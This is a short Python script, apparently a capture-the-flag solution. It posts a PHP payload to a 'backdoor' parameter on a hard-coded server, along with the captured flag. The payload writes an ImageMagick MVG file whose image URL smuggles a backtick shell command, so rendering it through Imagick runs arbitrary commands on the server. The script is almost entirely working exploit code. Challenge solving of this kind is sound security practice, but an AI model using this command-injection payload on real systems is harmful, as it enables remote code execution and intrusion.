import requests

# flag{PUTENVANDIMAGICKAREGOODFRIENDS}

rnd_str = "6f6f68de9e13e8d2580a7c140715c712"

url = "http://111.186.63.208:31340/"

payload = f"""
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$dir = "/tmp/{rnd_str}";
$command = isset($_GET['cmd']) ? $_GET['cmd'] : '/readflag';
$data_file = tempnam("$dir", 'flag');
$imagick_file = tempnam("$dir", 'img');
 
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`\\readflag > $data_file`'
pop graphic-context
EOF;

file_put_contents("$imagick_file", $exploit);

$thumb = new Imagick();
$thumb->readImageBlob($imagick_file);
$thumb->writeImage(tempnam("$dir", 'img'));
$thumb->clear();
$thumb->destroy();
 
echo file_get_contents($data_file);
?>
"""

data = {"backdoor":payload}

x = requests.post(url, data=data)

print(x.text)